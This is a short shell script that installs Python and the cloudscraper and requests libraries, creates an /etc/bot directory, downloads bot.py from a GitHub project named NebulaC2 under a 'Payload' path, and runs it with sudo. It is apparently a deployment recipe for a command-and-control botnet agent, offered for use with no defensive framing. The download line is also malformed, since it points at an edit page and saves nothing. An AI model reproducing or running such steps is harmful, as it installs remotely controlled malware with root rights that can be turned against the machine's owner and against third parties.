sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
pip install cloudscraper requests && pip3 install cloudscraper requests
cd /etc
mkdir bot
cd /etc/bot
curl https://github.com/NixWasHere/NebulaC2/edit/main/src/Payload/bot.py
sudo python3 bot.py
